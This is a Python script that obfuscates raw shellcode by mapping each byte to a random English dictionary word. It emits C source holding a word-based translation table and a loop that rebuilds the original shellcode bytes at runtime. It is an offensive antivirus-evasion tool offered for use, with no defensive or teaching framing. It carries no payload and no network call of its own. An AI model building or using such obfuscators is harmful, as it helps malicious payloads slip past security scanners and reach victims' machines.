import random
import os

def jargon_obfuscation(input_path, output_path, dictionary_path="dictionary.txt"):
    def gen_word_combinations(dict_file):
        try:
            with open(dict_file) as dictionary:
                words = dictionary.readlines()
        except FileNotFoundError:
            raise FileNotFoundError(f"The dictionary '{dict_file}' does not exist.")
        
        try:
            return random.sample(words, 257)
        except ValueError:
            raise ValueError("Dictionary must contain at least 257 words.")

    def get_shellcode(input_file):
        try:
            with open(input_file, 'rb') as f:
                shellcode = f.read().strip()
                binary_code = ''.join(f"\\x{byte:02x}" for byte in shellcode)
                return "0" + ",0".join(binary_code.split("\\")[1:])
        except FileNotFoundError:
            raise FileNotFoundError(f"Input file '{input_file}' not found.")

    # Build translation table
    words = gen_word_combinations(dictionary_path)
    english_array = [words.pop(1).strip() for _ in range(256)]

    translation_table = 'unsigned char* translation_table[256] = { '
    translation_table += ','.join(f'"{word}"' for word in english_array)
    translation_table += ' };\n'

    # Shellcode
    shellcode = get_shellcode(input_path)
    sc_len = len(shellcode.split(','))

    translated_shellcode = 'unsigned char* translated_shellcode[{}] = {{ {} }};\n'.format(
        sc_len,
        ','.join(f'"{english_array[int(byte, 16)]}"' for byte in shellcode.split(','))
    )

    shellcode_var = f"unsigned char shellcode[{sc_len}] = {{0}};"

    forloop = f'''
        printf("Translating shellcode!\\n");
        for (int sc_index = 0; sc_index < {sc_len}; sc_index++) {{
            for (int tt_index = 0; tt_index <= 255; tt_index++) {{
                if (strcmp(translation_table[tt_index], translated_shellcode[sc_index]) == 0) {{
                    shellcode[sc_index] = tt_index;
                    break;
                }}
            }}
        }}
    '''

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "w") as f:
        f.write(translation_table)
        f.write(translated_shellcode)
        f.write(shellcode_var + "\n")
        f.write(f"int sc_len = sizeof(shellcode);\n")
        f.write(forloop + "\n")
    
    return f"[+] Obfuscation complete. Saved to {output_path}"
